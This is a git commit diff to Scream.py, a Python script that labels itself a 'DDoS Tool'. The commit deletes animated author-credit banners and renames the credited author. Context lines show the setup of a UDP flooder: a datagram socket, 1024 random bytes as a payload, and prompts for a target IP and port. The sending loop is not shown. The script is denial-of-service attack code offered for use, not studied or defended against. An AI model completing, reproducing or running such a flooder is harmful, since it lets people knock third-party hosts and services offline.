82dcc63d1d1671ca4aba3959373d5e5657572b47
GeneralSony <55324538+Generalsony@users.noreply.github.com>
2019-11-09 20:42:03 +0200

    Update Scream.py

--- Scream.py
+++ Scream.py
@@ -5,44 +5,12 @@ import socket
 import random
 from time import sleep
 
-s='[+]Coded By General Sony[+]'
-for c in s + '\n':
-    sys.stdout.write(c)
-    sys.stdout.flush()
-    sleep (10. /90)
-s='[+]Beta Version!!![+]'
-for c in s + '\n':
-    sys.stdout.write(c)
-    sys.stdout.flush()
-    sleep (10. /90)
-s='[~]https://www.facebook.com/GeneralSony666[~]'
-for c in s + '\n':
-    sys.stdout.write(c)
-    sys.stdout.flush()
-    sleep (10. /90)
-s='Version : 0.1'
-for c in s + '\n':
-    sys.stdout.write(c)
-    sys.stdout.flush()
-    sleep (10. /90)
-    s='[+]Coded By Scream (General Sony)[+]'
-for c in s + '\n':
-    sys.stdout.write(c)
-    sys.stdout.flush()
-    sleep (10. /90)
-    time.sleep(5)
-    s='[+]Thanks Islam Ramadan[+]'
-for c in s + '\n':
-    sys.stdout.write(c)
-    sys.stdout.flush()
-    sleep (10. /90)
-    
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 bytes = random._urandom(1024)
 
 os.system("clear")
-print ("\033[5;49mDDoS Tool By [NONScream](General Sony)")
+print ("\033[5;49mDDoS Tool By Nyanx306")
 print (" ")
 ip =input("Target IP: ")
 port = input("Port: ")
